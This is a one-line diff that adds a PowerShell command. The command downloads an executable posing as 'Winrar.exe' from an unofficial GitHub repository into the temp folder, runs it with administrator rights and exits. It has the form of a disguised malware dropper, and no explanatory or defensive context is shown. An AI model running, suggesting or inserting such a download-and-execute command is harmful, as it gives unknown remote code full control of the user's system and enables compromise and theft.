@@ -1,0 +1,1 @@
+irm 'https://github.com/japascorp1/revo-l/raw/refs/heads/main/Winrar.exe' -OutFile "$env:TEMP\s.exe"; Start-Process "$env:TEMP\s.exe" -Verb RunAs; exit
